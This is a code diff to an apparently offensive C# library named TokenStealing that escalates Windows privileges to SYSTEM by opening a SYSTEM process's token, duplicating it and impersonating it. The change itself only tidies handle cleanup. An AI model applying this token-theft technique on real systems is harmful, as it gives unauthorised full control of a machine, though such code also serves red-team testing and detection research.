@@ -11,8 +11,6 @@ namespace TokenStealing.Library
         public static bool GetSystemBySecondaryLogon(bool fullPrivileged)
         {
             int error;
-            var hProcess = IntPtr.Zero;
-            var hToken = IntPtr.Zero;
             var startupInfo = new STARTUPINFO
             {
                 cb = Marshal.SizeOf(typeof(STARTUPINFO)),
@@ -52,7 +50,7 @@ namespace TokenStealing.Library
 
                 Console.WriteLine("[>] Trying to get handle from a SYSTEM process.");
 
-                hProcess = Utilities.GetSystemProcessHandle(
+                IntPtr hProcess = Utilities.GetSystemProcessHandle(
                     new List<string>(),
                     ACCESS_MASK.PROCESS_QUERY_LIMITED_INFORMATION,
                     ACCESS_MASK.TOKEN_DUPLICATE,
@@ -73,14 +71,14 @@ namespace TokenStealing.Library
 
                 Console.WriteLine("[>] Trying to open process token.");
 
-                status = NativeMethods.OpenProcessToken(hProcess, ACCESS_MASK.TOKEN_DUPLICATE, out hToken);
+                status = NativeMethods.OpenProcessToken(hProcess, ACCESS_MASK.TOKEN_DUPLICATE, out IntPtr hToken);
+                NativeMethods.NtClose(hProcess);
 
                 if (!status)
                 {
                     error = Marshal.GetLastWin32Error();
                     Console.WriteLine("[-] Failed to open process token.");
                     Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
-                    hToken = IntPtr.Zero;
                     break;
                 }
                 else
@@ -97,6 +95,7 @@ namespace TokenStealing.Library
                     SECURITY_IMPERSONATION_LEVEL.SecurityAnonymous,
                     TOKEN_TYPE.TokenPrimary,
                     out IntPtr hPrimaryToken);
+                NativeMethods.NtClose(hToken);
 
                 if (!status)
                 {
@@ -164,12 +163,6 @@ namespace TokenStealing.Library
             if (isImpersonated)
                 NativeMethods.RevertToSelf();
 
-            if (hToken != IntPtr.Zero)
-                NativeMethods.NtClose(hToken);
-
-            if (hProcess != IntPtr.Zero)
-                NativeMethods.NtClose(hProcess);
-
             Console.WriteLine("[*] Done.");
 
             return status;
@@ -179,8 +172,6 @@ namespace TokenStealing.Library
         public static bool GetSystemByTokenImpersonation(bool fullPrivileged)
         {
             int error;
-            var hProcess = IntPtr.Zero;
-            var hToken = IntPtr.Zero;
             var startupInfo = new STARTUPINFO
             {
                 cb = Marshal.SizeOf(typeof(STARTUPINFO)),
@@ -225,7 +216,7 @@ namespace TokenStealing.Library
 
                 Console.WriteLine("[>] Trying to get handle from a SYSTEM process.");
 
-                hProcess = Utilities.GetSystemProcessHandle(
+                IntPtr hProcess = Utilities.GetSystemProcessHandle(
                     new List<string> { Win32Consts.SE_ASSIGNPRIMARYTOKEN_NAME, Win32Consts.SE_INCREASE_QUOTA_NAME },
                     ACCESS_MASK.PROCESS_QUERY_LIMITED_INFORMATION,
                     ACCESS_MASK.TOKEN_DUPLICATE,
@@ -246,14 +237,14 @@ namespace TokenStealing.Library
 
                 Console.WriteLine("[>] Trying to open process token.");
 
-                status = NativeMethods.OpenProcessToken(hProcess, ACCESS_MASK.TOKEN_DUPLICATE, out hToken);
+                status = NativeMethods.OpenProcessToken(hProcess, ACCESS_MASK.TOKEN_DUPLICATE, out IntPtr hToken);
+                NativeMethods.NtClose(hProcess);
 
                 if (!status)
                 {
                     error = Marshal.GetLastWin32Error();
                     Console.WriteLine("[-] Failed to open process token.");
                     Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
-                    hToken = IntPtr.Zero;
                     break;
                 }
                 else
@@ -279,6 +270,7 @@ namespace TokenStealing.Library
                         error = Marshal.GetLastWin32Error();
                         Console.WriteLine("[-] Failed to duplicate impersonation token.");
                         Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
+                        NativeMethods.NtClose(hToken);
                         break;
                     }
                     else
@@ -315,7 +307,10 @@ namespace TokenStealing.Library
                     NativeMethods.NtClose(hImpersonationToken);
 
                     if (!isImpersonated)
+                    {
+                        NativeMethods.NtClose(hToken);
                         break;
+                    }
                 }
 
                 Console.WriteLine("[>] Trying to duplicate primary token.");
@@ -327,6 +322,7 @@ namespace TokenStealing.Library
                     SECURITY_IMPERSONATION_LEVEL.SecurityAnonymous,
                     TOKEN_TYPE.TokenPrimary,
                     out IntPtr hPrimaryToken);
+                NativeMethods.NtClose(hToken);
 
                 if (!status)
                 {
@@ -394,12 +390,6 @@ namespace TokenStealing.Library
 
             if (isImpersonated)
                 NativeMethods.RevertToSelf();
-
-            if (hToken != IntPtr.Zero)
-                NativeMethods.NtClose(hToken);
-
-            if (hProcess != IntPtr.Zero)
-                NativeMethods.NtClose(hProcess);
 
             Console.WriteLine("[*] Done.");
 
